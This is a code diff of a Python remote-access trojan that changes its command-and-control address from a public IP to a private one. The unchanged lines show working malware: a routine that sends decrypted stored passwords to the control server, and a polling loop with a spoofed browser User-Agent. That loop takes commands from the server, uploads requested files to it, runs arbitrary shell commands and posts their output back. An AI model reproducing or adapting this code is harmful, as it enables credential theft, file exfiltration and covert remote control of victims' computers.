@@ -60,7 +60,7 @@ def search():
                      "password": decrypted_password}
             pack.append(data)
 
-        url = 'http://54.167.179.254:8080'
+        url = 'http://172.26.3.29:8081'
         packstr = str(pack)
         post = requests.post(url, data=packstr.encode())
 
@@ -80,7 +80,7 @@ def search():
 def connect():
     while True:
         head = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
-        req = requests.get('http://54.167.179.254:8080', headers=head)
+        req = requests.get('http://172.26.3.29:8081', headers=head)
         command = req.text
 
         if 'terminate' in command:
@@ -90,19 +90,19 @@ def connect():
             get, path = command.split("*")
 
             if os.path.exists(path):
-                url = 'http://54.167.179.254:8080/store'
+                url = 'http://172.26.3.29:8081'
                 files = {'file': open(path, 'rb')}
                 r = requests.post(url, files=files)
             else:
-                post_response = requests.post(url='http://54.167.179.254:8080/store',
+                post_response = requests.post(url='http://172.26.3.29:8081',
                                               data='[-] Não foi possível transferir o arquivo'.encode())
         elif 'search' in command:
             search()
         else:
             CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
-            post_response = requests.post(url='http://54.167.179.254:8080', data=CMD.stdout.read())
-            post_response = requests.post(url='http://54.167.179.254:8080', data=CMD.stderr.read())
+            post_response = requests.post(url='http://172.26.3.29:8081', data=CMD.stdout.read())
+            post_response = requests.post(url='http://172.26.3.29:8081', data=CMD.stderr.read())
         time.sleep(3)
 
 if __name__ == '__main__':
